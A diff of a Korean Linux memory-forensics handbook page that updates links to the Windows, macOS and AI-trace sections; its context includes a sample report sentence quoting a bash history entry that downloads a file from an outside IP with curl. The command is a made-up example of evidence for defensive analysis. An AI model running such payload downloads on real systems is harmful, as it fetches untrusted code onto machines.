@@ -129,7 +129,7 @@ Volatility 3 2.11 용 연구 플러그인 `xevents`, `xinputextensions`, `xclien
 
 **보고서 문장 예.** "메모리 이미지(수집 2026-03-14 02:10Z)에서 PID 2481 인 bash 프로세스의 명령 기록에 `curl -o upd http://203.0.113.10/upd` 가 있고, 기록 시각은 2026-03-14 01:52:31 UTC 이다. 같은 이미지의 `linux.sockstat` 결과에는 203.0.113.10 과의 TCP 연결이 없다." (값은 모두 만든 예시)
 
-다른 운영체제의 메모리 분석은 [Windows 메모리 분석](https://urock-ailab.github.io/forensics-handbook-windows/03-techniques/analysis/memory-forensics/index.html), [macOS 메모리 분석](https://urock-ailab.github.io/forensics-handbook-mac/03-techniques/analysis/memory-forensics/index.html), [메모리에서 AI 흔적 찾기](https://urock-ailab.github.io/forensics-handbook-ai/03-techniques/analysis/memory-analysis.html) 에서 다룹니다.
+다른 운영체제의 메모리 분석은 [Windows 메모리 분석](https://urock-ailab.github.io/forensics-handbook/windows/03-techniques/analysis/memory-forensics/index.html), [macOS 메모리 분석](https://urock-ailab.github.io/forensics-handbook/mac/03-techniques/analysis/memory-forensics/index.html), [메모리에서 AI 흔적 찾기](https://urock-ailab.github.io/forensics-handbook/ai/03-techniques/analysis/memory-analysis.html) 에서 다룹니다.
 
 ## 참고 문헌
 
